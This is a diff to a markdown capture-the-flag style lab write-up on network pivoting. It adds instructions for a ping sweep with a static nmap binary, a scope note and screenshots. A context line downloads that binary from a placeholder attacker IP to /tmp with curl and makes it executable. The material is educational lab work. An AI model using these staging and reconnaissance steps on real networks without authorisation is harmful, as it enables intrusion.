@@ -966,7 +966,32 @@
        curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
 
 
-   ![image](https://user-images.githubusercontent.com/68686150/115669155-9878a580-a365-11eb-9ca8-b0a7bc88741a.png)
+   ![image](https://user-images.githubusercontent.com/68686150/115669464-ea213000-a365-11eb-91a5-52ebf14458bc.png)
+
+   Now use the binary to scan the network. The command will look something like this:
+
+      ./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME
+
+   You will need to substitute in your username, and the correct IP range. For example:
+
+      ./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle
+
+   Here the -sn switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.
+
+   Note that this would also work with CIDR notation (e.g. 10.x.x.0/24).
+
+   Use what you've learnt to answer the following questions!
+
+   Note: The host ending in .250 is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same    goes for the host ending in .1 (part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers.
+
+
+  ![image](https://user-images.githubusercontent.com/68686150/115669648-1fc61900-a366-11eb-9d1e-ab837438933b.png)
+
+  ![image](https://user-images.githubusercontent.com/68686150/115669731-37050680-a366-11eb-97a8-aed4086960b2.png)
+
+
+
+
 
 
 
